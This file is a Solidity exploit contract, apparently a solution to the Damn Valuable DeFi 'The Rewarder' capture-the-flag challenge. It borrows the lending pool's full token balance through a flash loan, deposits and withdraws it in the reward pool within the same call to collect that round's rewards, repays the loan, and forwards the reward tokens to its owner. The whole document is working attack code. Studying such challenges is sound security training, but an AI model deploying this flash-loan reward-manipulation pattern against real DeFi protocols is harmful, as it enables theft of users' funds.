// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewardExploiter {
    FlashLoanerPool public immutable loanPool;
    TheRewarderPool public immutable rewardPool;
    DamnValuableToken public immutable lpToken;
    RewardToken public immutable rewardToken;
    address private immutable owner;

    constructor(address _loanPool, address _rewardPool) {
        loanPool = FlashLoanerPool(_loanPool);
        rewardPool = TheRewarderPool(_rewardPool);
        lpToken = loanPool.liquidityToken();
        rewardToken = rewardPool.rewardToken();
        lpToken.approve(address(rewardPool), type(uint256).max);
        owner = msg.sender;
    }

    function exploit() external {
        loanPool.flashLoan(lpToken.balanceOf(address(loanPool)));
        rewardToken.transfer(owner, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 amount) external {
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        SafeTransferLib.safeTransfer(address(lpToken), address(loanPool), amount);
    }
}
